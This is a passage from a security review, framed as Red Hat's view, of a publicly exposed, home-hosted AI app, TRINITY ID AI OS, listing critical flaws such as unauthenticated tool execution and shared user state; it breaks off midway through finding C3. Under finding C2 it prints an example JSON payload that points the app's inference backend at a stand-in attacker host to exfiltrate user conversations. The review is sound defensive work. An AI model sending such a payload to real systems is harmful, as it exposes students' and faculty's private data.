# Red Hat Public Edge Safety Response

**Timestamp**: 2026-03-24 09:07 UTC-04:00  
**Reviewer Perspective**: Red Hat AI security and safety team point of view  
**Context**: Public Purdue-facing deployment from a home-hosted edge device via `LDTAtkinson.com`  
**Scope**: Public internet safety, education/privacy risk, deployment controls, exposed API risk, and Red Hat-standard operational readiness  
**Project**: `TRINITY ID AI OS`

---

## Handling Note

This report intentionally refers to the deployment as a **home-hosted residential edge deployment** rather than repeating the exact street address. That is a deliberate safety choice and consistent with the principle of minimizing sensitive infrastructure disclosure.

---

## Executive Decision

## Bottom line

**In its current form, TRINITY ID AI OS is not safe for public internet exposure to Purdue professors or students.**

If this system is reachable via `LDTAtkinson.com` from the open internet, the current code and deployment model create **multiple Critical risks**, including:

- public unauthenticated tool execution
- public unauthenticated runtime control
- public shared single-user state across all users
- public exposure of conversation and project data
- blacklist-based shell and Python execution instead of real sandboxing
- a critical exfiltration pivot through arbitrary inference-backend URL switching
- lack of meaningful authn/authz boundaries for a public educational deployment

### Red Hat-style disposition

- **Research prototype**: viable for isolated local testing
- **Private single-user lab use**: conditionally acceptable with caution
- **Public Purdue-facing website use**: **no-go** in current state
- **Production-ready by Red Hat standard**: **not yet**

If the question is:

> Can professors and students safely use this from `LDTAtkinson.com` right now?

The answer is:

**No. Not without a major hardening pass and a change in deployment architecture.**

---

## Why Rust Helps, and Why Rust Is Not Enough

Rust is a strong engineering decision.

### What Rust gives you

Rust meaningfully reduces entire classes of bugs:

- use-after-free
- buffer overflows
- many memory corruption issues
- some concurrency hazards through ownership and type safety

That matters. It is a real security advantage.

### What Rust does **not** give you

Rust does **not** automatically protect against:

- unauthenticated dangerous endpoints
- broken authorization logic
- insecure routing and proxy exposure
- unsafe subprocess execution
- shell/Python abuse
- shared-state multi-user design flaws
- data exfiltration by business-logic abuse
- dangerous defaults in public deployments
- insecure reverse proxy policy
- privacy failures in persistence and logging

### Red Hat POV

Rust is a **foundation**, not a waiver.

For Red Hat-grade safety, the standard is not just “memory safe code.” The standard is:

- **secure by default**
- **least privilege**
- **auth before action**
- **isolation for untrusted execution**
- **clear trust boundaries**
- **tenant separation**
- **honest documentation of controls**
- **operational hardening for real deployment context**

---

## Deployment Context Assumed in This Review

This review assumes the deployment model you described:

- the app is served publicly via `LDTAtkinson.com`
- the service runs from a **residential/home edge device**
- Purdue professors and students will access it over the internet
- safety is the top priority
- the deployment is not just a local private machine anymore; it is a **publicly reachable service**

This context matters because compromise of a home-hosted public service is not just an application issue. It can become:

- a privacy issue
- a student data issue
- a reputation issue
- a home-network issue
- a physical environment issue
- a lateral movement risk if the host is not isolated from the rest of the household network

---

## Red Hat Safety Standard Applied Here

For this review, I’m using a practical Red Hat-style standard for public AI services.

A public educational AI system should meet these minimum conditions:

### 1. Secure by default

The default deployment should not expose dangerous functionality without an explicit, hardened opt-in.

### 2. Authentication before sensitive action

No sensitive route should be reachable anonymously if it can:

- execute tools
- mutate state
- access private data
- alter runtime configuration
- trigger expensive compute
- return internal operational details

### 3. Least privilege

Any tool or subsystem should have the minimum access needed.

### 4. Isolation of dangerous execution

If shell, Python, file operations, or sidecar control exist, they must be isolated from the public-facing trust boundary.

### 5. Tenant separation

Students, faculty, and admins must not share a single mutable global state.

### 6. Constrained egress

A “local-first” system must not allow easy redirection of inference or data to attacker-controlled external endpoints.

### 7. Resource abuse protection

Public endpoints must be protected against denial-of-service and compute abuse.

### 8. Honest claims

Security documentation must not overstate what the implementation actually enforces.

By this standard, the current public deployment posture fails in multiple areas.

---

## What the Current Public Deployment Actually Looks Like

Based on code and deployment files:

### Reverse proxy and exposure

- `configs/Caddyfile` proxies the public site directly to `localhost:3000`
- `scripts/deploy_website.sh` instructs forwarding router ports `80` and `443` to the Trinity host on the home LAN
- `crates/trinity/src/main.rs` binds the server to `0.0.0.0:3000`
- the Axum app uses `CorsLayer::permissive()`

### What this means

The system is not merely “running locally.” It is:

- exposed through a public domain
- reachable through residential port forwarding
- fronted by a reverse proxy with no visible auth guard in the checked config
- serving a very large API surface from a single public trust boundary

That is a fundamentally different risk profile from “teacher running a local app on their own machine.”

---

## High-Level Risk Summary

## Critical findings

- **C1** — Public unauthenticated tool execution via `/api/tools/execute`
- **C2** — Public arbitrary inference backend redirection via `/api/models/switch`
- **C3** — Public shared single-user state across all users
- **C4** — No meaningful authn/authz on sensitive public routes
- **C5** — Public exposure of session/project/history data
- **C6** — Shell/Python execution is not sandboxed in a Red Hat sense

## High findings

- **H1** — Reverse proxy lacks visible auth and header hardening
- **H2** — Broad home-directory read permission in public-exposed tooling
- **H3** — No request-size/concurrency protections for upload and generation routes
- **H4** — Public admin-style runtime mutation endpoints
- **H5** — Health and hardware endpoints leak internal operational details
- **H6** — Plaintext persistence of messages, images, and tool-call parameters

## Medium findings

- **M1** — Public docs and health metadata increase fingerprinting
- **M2** — Documentation overstates safety relative to implementation
- **M3** — Residential deployment increases blast radius beyond normal app hosting

---

## Detailed Findings

# C1. Public unauthenticated tool execution

## Severity

**Critical**

## Evidence

- `crates/trinity/src/main.rs`
  - registers `POST /api/tools/execute`
- `crates/trinity/src/tools.rs`
  - `execute_tool()` calls `run_tool()` directly
- `crates/trinity/src/agent.rs`
  - the stronger Ring 2 and Ring 5 enforcement exists in `execute_tool_internal()` for the agent loop, not in the public HTTP handler

### Relevant code behavior

The public route:

- accepts a tool name and params
- executes the selected tool
- does not require authentication
- does not apply the same destructive-tool clearance path enforced in the internal agent flow

## Why this matters

This is the core safety failure.

The documentation presents a ring-based permission system, but the public HTTP tool execution path bypasses the stricter control logic. In a public deployment, that means anonymous users can reach dangerous operations directly.

## Impact

Potential impact includes:

- file read/write abuse
- shell command execution attempts
- Python execution attempts
- sidecar/process control
- project archiving or destructive state changes
- heavy compute abuse

Even if some commands are blocked by blacklist rules, this is still a **public command execution surface**, which is unacceptable by Red Hat production standards.

## Red Hat judgment

A public tool-execution endpoint without auth is a **hard blocker**.

---

# C2. Public arbitrary inference backend redirection enables exfiltration

## Severity

**Critical**

## Evidence

- `crates/trinity/src/main.rs`
  - `POST /api/models/switch` accepts either backend name or `url`
- `crates/trinity/src/inference_router.rs`
  - `set_active_url(url)` will add a brand-new custom backend if the URL is unknown
  - the custom backend is marked active and assumed healthy
- multiple callers use `state.inference_router.read().await.active_url()` for inference
  - chat
  - agent
  - voice text flow
  - narrative generation
  - health reporting
  - RAG embedding generation uses `LLM_URL` logic and local base assumptions, but live inference paths rely on the active router URL

## Why this matters

This is a major escalation beyond the earlier findings.

An unauthenticated caller can likely send:

```json
{
  "url": "https://attacker.example"
}
```

to the public model-switch endpoint and redirect future inference traffic to an attacker-controlled service.

## Consequences

This can turn a “local-first” system into a **remote data exfiltration path**.

Potentially exposed content includes:

- user prompts
- conversation history
- generated content
- narrative context
- student/faculty interaction content
- possibly structured tool-related context

If Purdue users are interacting with the site under the belief that the system is local and private, this is a severe trust and privacy failure.

## Red Hat judgment

This is a **Critical blocker** and likely the single most important new finding for public deployment.

This endpoint must not be public, and arbitrary URL switching must not exist in a public multi-user environment.

---

# C3. Public shared single-user state across all users

## Severity

**Critical**

## Evidence

- `AppState` in `main.rs` holds shared global state:
  - `conversation_history`
  - `game_state`
  - `character_sheet`
  - `book_updates`
  - `session_id`
  - `bestiary`
  - `book`
- startup initializes a **single session ID** at process startup
- quest state loads the `
